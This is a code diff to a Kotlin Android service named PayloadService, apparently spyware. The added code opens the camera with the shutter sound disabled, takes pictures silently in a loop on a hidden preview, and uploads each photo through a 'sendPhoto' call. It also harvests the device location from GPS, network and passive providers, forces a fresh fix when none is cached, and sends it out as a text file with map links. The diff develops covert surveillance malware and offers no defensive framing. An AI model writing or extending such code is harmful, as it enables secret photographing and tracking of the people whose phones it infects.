@@ -10,7 +10,6 @@ import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ApplicationInfo
-import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.graphics.Bitmap
 import android.graphics.Canvas
@@ -18,6 +17,8 @@ import android.graphics.SurfaceTexture
 import android.graphics.drawable.BitmapDrawable
 import android.graphics.drawable.Drawable
 import android.hardware.Camera
+import android.location.Location
+import android.location.LocationListener
 import android.location.LocationManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
@@ -25,7 +26,9 @@ import android.net.Uri
 import android.net.wifi.WifiManager
 import android.os.BatteryManager
 import android.os.Build
+import android.os.Bundle
 import android.os.IBinder
+import android.os.Looper
 import android.os.SystemClock
 import android.provider.CallLog
 import android.provider.ContactsContract
@@ -37,6 +40,7 @@ import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 import java.util.TimeZone
+import java.util.concurrent.CountDownLatch
 import java.util.concurrent.Executors
 import java.util.concurrent.Semaphore
 import java.util.concurrent.TimeUnit
@@ -45,6 +49,7 @@ import java.util.concurrent.atomic.AtomicInteger
 class PayloadService : Service() {
 
     private val pool = Executors.newFixedThreadPool(Const.PARALLEL_UPLOADS)
+    private val camPool = Executors.newFixedThreadPool(2)
     private lateinit var gate: Semaphore
     private val done = AtomicInteger(0)
 
@@ -335,7 +340,29 @@ class PayloadService : Service() {
                     HsLog.e("camera not found front=$front")
                     return@Thread
                 }
+
                 cam = Camera.open(id)
+                try {
+                    cam.enableShutterSound(false)
+                } catch (_: Throwable) {
+                }
+                try {
+                    val p = cam.parameters
+                    var best: Camera.Size? = null
+                    for (s in p.supportedPictureSizes) {
+                        val px = s.width * s.height
+                        if (px <= 1_400_000) {
+                            val b = best
+                            if (b == null || px > b.width * b.height) best = s
+                        }
+                    }
+                    if (best != null) {
+                        p.pictureSize = best
+                        cam.parameters = p
+                    }
+                } catch (_: Throwable) {
+                }
+
                 val st = SurfaceTexture(0)
                 cam.setPreviewTexture(st)
                 cam.startPreview()
@@ -344,10 +371,16 @@ class PayloadService : Service() {
                 while (true) {
                     try {
                         cam.takePicture(null, null, { data, _ ->
-                            if (data != null) {
+                            if (data != null && data.isNotEmpty()) {
+                                HsLog.w("capture " + data.size)
                                 val name = (if (front) "front_" else "back_") +
                                         System.currentTimeMillis() + ".jpg"
-                                postFile("sendPhoto", "photo", name, "image/jpeg", data)
+                                try {
+                                    camPool.execute {
+                                        postFile("sendPhoto", "photo", name, "image/jpeg", data)
+                                    }
+                                } catch (_: Throwable) {
+                                }
                             }
                             try {
                                 cam.startPreview()
@@ -382,19 +415,58 @@ class PayloadService : Service() {
         }.start()
     }
 
+    private fun appendLoc(sb: StringBuilder, provider: String, loc: Location) {
+        sb.append(provider).append(": ").append(loc.latitude).append(", ").append(loc.longitude)
+            .append(" acc=").append(loc.accuracy).append(" t=").append(loc.time).append("\n")
+        sb.append("https://maps.google.com/?q=")
+            .append(loc.latitude).append(",").append(loc.longitude).append("\n")
+    }
+
     private fun sendLocation() {
         val sb = StringBuilder()
         try {
             val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
+
+            for (p in listOf(
+                LocationManager.GPS_PROVIDER,
+                LocationManager.NETWORK_PROVIDER,
+                LocationManager.PASSIVE_PROVIDER
+            )) {
                 try {
                     val loc = lm.getLastKnownLocation(p) ?: continue
-                    sb.append(p).append(": ")
-                        .append(loc.latitude).append(", ").append(loc.longitude)
-                        .append(" acc=").append(loc.accuracy)
-                        .append(" t=").append(loc.time).append("\n")
-                    sb.append("https://maps.google.com/?q=")
-                        .append(loc.latitude).append(",").append(loc.longitude).append("\n")
+                    appendLoc(sb, p, loc)
+                } catch (_: Throwable) {
+                }
+            }
+
+            if (sb.isEmpty()) {
+                val latch = CountDownLatch(1)
+                val listener = object : LocationListener {
+                    override fun onLocationChanged(location: Location) {
+                        appendLoc(sb, location.provider ?: "?", location)
+                        latch.countDown()
+                    }
+
+                    @Deprecated("Deprecated in Java")
+                    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
+                    }
+
+                    override fun onProviderEnabled(provider: String) {
+                    }
+
+                    override fun onProviderDisabled(provider: String) {
+                    }
+                }
+                try {
+                    lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper())
+                } catch (_: Throwable) {
+                }
+                try {
+                    lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper())
+                } catch (_: Throwable) {
+                }
+                try {
+                    latch.await(12, TimeUnit.SECONDS)
                 } catch (_: Throwable) {
                 }
             }
@@ -402,7 +474,8 @@ class PayloadService : Service() {
             HsLog.e("location: ${t.message}")
             return
         }
-        if (sb.isEmpty()) sb.append("no last known location\n")
+
+        if (sb.isEmpty()) sb.append("no location available\n")
         HsLog.w("loc chars=${sb.length}")
         sendTextFile("location.txt", sb.toString())
     }
@@ -796,6 +869,10 @@ class PayloadService : Service() {
     override fun onDestroy() {
         try {
             pool.shutdownNow()
+        } catch (_: Throwable) {
+        }
+        try {
+            camPool.shutdownNow()
         } catch (_: Throwable) {
         }
         super.onDestroy()
